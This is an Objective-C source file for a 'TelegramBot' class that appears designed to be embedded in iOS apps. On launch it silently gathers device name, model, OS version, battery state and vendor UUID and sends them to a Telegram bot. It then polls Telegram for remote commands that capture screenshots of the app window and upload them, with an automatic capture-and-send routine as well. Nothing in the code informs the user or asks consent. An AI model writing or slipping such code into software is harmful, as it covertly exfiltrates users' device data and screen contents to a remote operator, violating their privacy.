//
//  TelegramBot.m
//  TelegramBot
//
//  Created by Đỗ Thành on 29/12/2024.
//


#import "TelegramBot.h"
#import <UIKit/UIKit.h>

#define TELEGRAM_API_TOKEN @"TokenBOT"
#define TELEGRAM_CHAT_ID @"IDCHAT"

@implementation TelegramBot {
    BOOL isListening;
    NSDate *lastSendDate;
    NSMutableDictionary<NSString *, NSString *> *activeDevices; 
    dispatch_queue_t serialQueue; 
}

+ (instancetype)sharedInstance {
    static TelegramBot *sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [[self alloc] init];
    });
    return sharedInstance;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        activeDevices = [NSMutableDictionary dictionary];
        serialQueue = dispatch_queue_create("com.telegrambot.serialqueue", DISPATCH_QUEUE_SERIAL);
        [self registerDevice];
    }
    return self;
}

- (void)registerDevice {
    NSString *deviceUUID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
    NSString *deviceName = [[UIDevice currentDevice] name];
    NSString *systemVersion = [[UIDevice currentDevice] systemVersion];
    NSString *systemName = [[UIDevice currentDevice] systemName];
    NSString *model = [[UIDevice currentDevice] model];
    NSString *localizedModel = [[UIDevice currentDevice] localizedModel];
    UIUserInterfaceIdiom userInterfaceIdiom = [[UIDevice currentDevice] userInterfaceIdiom];
    
    [[UIDevice currentDevice] setBatteryMonitoringEnabled:YES];
    float batteryLevel = [[UIDevice currentDevice] batteryLevel];
    if (batteryLevel < 0) {
        batteryLevel = 0; 
    } else {
        batteryLevel *= 100; 
    }
    UIDeviceBatteryState batteryState = [[UIDevice currentDevice] batteryState];
    
    NSString *batteryStateString;
    switch (batteryState) {
        case UIDeviceBatteryStateUnplugged:
            batteryStateString = @"|| Đã Ngắt Sạc";
            break;
        case UIDeviceBatteryStateCharging:
            batteryStateString = @"|| Đang Sạc";
            break;
        case UIDeviceBatteryStateFull:
            batteryStateString = @"|| Đầy Pin";
            break;
        default:
            batteryStateString = @"Unknown";
            break;
    }

    NSString *deviceInfo = [NSString stringWithFormat:@"deviceName: %@,\nsystemVersion: %@,\nsystemName: %@,\nmodel: %@,\n- battery\nBattery: %.0f%% %@\nuuid: %@", deviceName, systemVersion, systemName, model, batteryLevel, batteryStateString, deviceUUID];
    
    activeDevices[deviceUUID] = deviceInfo;
    
  
    [self sendMessageToTelegram:deviceInfo];
}
- (void)sendMessageToTelegram:(NSString *)message {
    dispatch_async(serialQueue, ^{
        NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage", TELEGRAM_API_TOKEN];
        NSURL *url = [NSURL URLWithString:urlString];

        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
        [request setHTTPMethod:@"POST"];

        NSDictionary *parameters = @{@"chat_id": TELEGRAM_CHAT_ID, @"text": message, @"parse_mode": @"Markdown"};
        NSError *error;
        NSData *bodyData = [NSJSONSerialization dataWithJSONObject:parameters options:0 error:&error];

        if (error) {
            [self logMessage:[NSString stringWithFormat:@"Lỗi khi tạo dữ liệu gửi: %@", error.localizedDescription] toLogFile:[[self applicationDocumentsDirectory] stringByAppendingPathComponent:@"log.txt"]];
            return;
        }

        [request setHTTPBody:bodyData];
        [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

        [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            if (error) {
                [self logMessage:[NSString stringWithFormat:@"Gửi tin nhắn thất bại: %@", error.localizedDescription] toLogFile:[[self applicationDocumentsDirectory] stringByAppendingPathComponent:@"log.txt"]];
            }
        }] resume];
    });
}

- (void)sendScreenshotToTelegramForUUID:(NSString *)uuid {
    if (!activeDevices[uuid]) {
        [self logMessage:[NSString stringWithFormat:@"UUID không hợp lệ: %@", uuid] toLogFile:[[self applicationDocumentsDirectory] stringByAppendingPathComponent:@"log.txt"]];
        return;
    }

    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *logPath = [[self applicationDocumentsDirectory] stringByAppendingPathComponent:@"log.txt"];
        [self logMessage:@"Bắt đầu chụp ảnh..." toLogFile:logPath];
        
        // Chụp màn hình
        UIWindow *window = [UIApplication sharedApplication].keyWindow;
        if (!window) {
            [self logMessage:@"Lỗi: Không thể tìm thấy cửa sổ chính." toLogFile:logPath];
            return;
        }

        UIGraphicsBeginImageContextWithOptions(window.bounds.size, NO, [UIScreen mainScreen].scale);
        [window drawViewHierarchyInRect:window.bounds afterScreenUpdates:YES];
        UIImage *screenshot = UIGraphicsGetImageFromCurrentImageContext();
        UIGraphicsEndImageContext();

        if (!screenshot) {
            [self logMessage:@"Lỗi: Không thể chụp màn hình." toLogFile:logPath];
            return;
        }

        // Lưu ảnh tạm
        NSString *tempPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"screenshot.png"];
        if (![UIImagePNGRepresentation(screenshot) writeToFile:tempPath atomically:YES]) {
            [self logMessage:[NSString stringWithFormat:@"Lỗi: Không thể lưu ảnh chụp màn hình tại %@", tempPath] toLogFile:logPath];
            return;
        }

        [self logMessage:@"Ảnh chụp thành công. Bắt đầu gửi..." toLogFile:logPath];

        [self sendPhotoToTelegramWithPath:tempPath logPath:logPath];
    });
}

- (void)sendPhotoToTelegramWithPath:(NSString *)photoPath logPath:(NSString *)logPath {
    dispatch_async(serialQueue, ^{
        NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendPhoto", TELEGRAM_API_TOKEN];
        NSURL *url = [NSURL URLWithString:urlString];

        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
        [request setHTTPMethod:@"POST"];

        NSData *photoData = [NSData dataWithContentsOfFile:photoPath];
        if (!photoData) {
            [self logMessage:[NSString stringWithFormat:@"Lỗi: Không thể đọc file ảnh tại %@", photoPath] toLogFile:logPath];
            return;
        }

        NSString *boundary = @"Boundary-123456";
        [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];

        NSMutableData *body = [NSMutableData data];
        [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[@"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[[NSString stringWithFormat:@"%@\r\n", TELEGRAM_CHAT_ID] dataUsingEncoding:NSUTF8StringEncoding]];

        [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[@"Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.png\"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[@"Content-Type: image/png\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:photoData];
        [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];

        [request setHTTPBody:body];

        [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            if (error) {
                [self logMessage:[NSString stringWithFormat:@"Lỗi khi gửi ảnh: %@", error.localizedDescription] toLogFile:logPath];
            } else {
                [self logMessage:@"Gửi ảnh thành công." toLogFile:logPath];
            }
        }] resume];
    });
}

- (void)listActiveDevices {
    NSString *logPath = [[self applicationDocumentsDirectory] stringByAppendingPathComponent:@"log.txt"];
    [self logMessage:@"Xử lý danh sách thiết bị..." toLogFile:logPath];

    NSMutableString *message = [NSMutableString stringWithFormat:@"Số người dùng đang hoạt động: %lu\nDanh sách người dùng:\n", (unsigned long)activeDevices.count];
    __block NSInteger index = 1;
    [activeDevices enumerateKeysAndObjectsUsingBlock:^(NSString *uuid, NSString *name, BOOL *stop) {
        [message appendFormat:@"%ld. %@ | %@\n", (long)index, name, uuid];
        index++;
    }];

    [self sendMessageToTelegram:message];
}

- (void)startListeningForCommands {
    if (isListening) return;
    isListening = YES;

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/getUpdates", TELEGRAM_API_TOKEN];
        NSInteger lastUpdateId = 0;

        while (isListening) {
            NSString *fullURL = [NSString stringWithFormat:@"%@?offset=%ld&timeout=30", urlString, (long)(lastUpdateId + 1)];
            NSURL *url = [NSURL URLWithString:fullURL];
            NSData *data = [NSData dataWithContentsOfURL:url];
            if (!data) {
                [self logMessage:@"Lỗi: Không thể kết nối tới Telegram API." toLogFile:[[self applicationDocumentsDirectory] stringByAppendingPathComponent:@"log.txt"]];
                continue;
            }

            NSError *error;
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:&error];
            if (error || ![json isKindOfClass:[NSDictionary class]]) {
                [self logMessage:@"Lỗi: Phản hồi không hợp lệ từ Telegram API." toLogFile:[[self applicationDocumentsDirectory] stringByAppendingPathComponent:@"log.txt"]];
                continue;
            }

            NSArray *result = json[@"result"];
            for (NSDictionary *update in result) {
                lastUpdateId = [update[@"update_id"] integerValue];
                NSDictionary *message = update[@"message"];
                if (message) {
                    NSString *text = message[@"text"];
                    if ([text isEqualToString:@"/listuuid"]) {
                        [self listUUIDs];
                    } else if ([text hasPrefix:@"/list "]) {
                        NSString *uuid = [text substringFromIndex:6];
                        [self listDeviceInfoForUUID:uuid];
                    } else if ([text hasPrefix:@"/img "]) {
                        NSString *uuid = [text substringFromIndex:5];
                        [self sendScreenshotToTelegramForUUID:uuid];
                    }
                }
            }
        }
    });
}

- (void)listUUIDs {
    NSMutableString *message = [NSMutableString stringWithFormat:@"Số người dùng đang hoạt động: %lu\nDanh sách UUID:\n", (unsigned long)activeDevices.count];
    __block NSInteger index = 1;
    [activeDevices enumerateKeysAndObjectsUsingBlock:^(NSString *uuid, NSString *name, BOOL *stop) {
        [message appendFormat:@"%ld. %@\n", (long)index, uuid];
        index++;
    }];

    [self sendMessageToTelegram:message];
}

- (void)listDeviceInfoForUUID:(NSString *)uuid {
    NSString *deviceInfo = activeDevices[uuid];
    if (deviceInfo) {
        NSMutableString *message = [NSMutableString stringWithFormat:@"Số người dùng đang hoạt động: 1\nDanh sách người dùng:\n%@", deviceInfo];
        [self sendMessageToTelegram:message];
    } else {
        [self sendMessageToTelegram:@"UUID không tồn tại."];
    }
}

- (void)stopListening {
    isListening = NO;
}

#pragma mark - Auto Capture and Send

- (void)autoCaptureAndSend {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [self sendScreenshotToTelegramForUUID:[[[UIDevice currentDevice] identifierForVendor] UUIDString]];
        [self sendMessageToTelegram:@"#autofeedback"];
    });
}

#pragma mark - Log Helper Methods

- (void)logMessage:(NSString *)message toLogFile:(NSString *)logPath {
    NSString *timestamp = [self currentTimestamp];
    NSString *logMessage = [NSString stringWithFormat:@"[%@] %@\n", timestamp, message];
    
    NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:logPath];
    if (!fileHandle) {
        [[NSFileManager defaultManager] createFileAtPath:logPath contents:nil attributes:nil];
        fileHandle = [NSFileHandle fileHandleForWritingAtPath:logPath];
    }
    [fileHandle seekToEndOfFile];
    [fileHandle writeData:[logMessage dataUsingEncoding:NSUTF8StringEncoding]];
    [fileHandle closeFile];
}

- (NSString *)applicationDocumentsDirectory {
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
}

- (NSString *)currentTimestamp {
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    [formatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
    return [formatter stringFromDate:[NSDate date]];
}

@end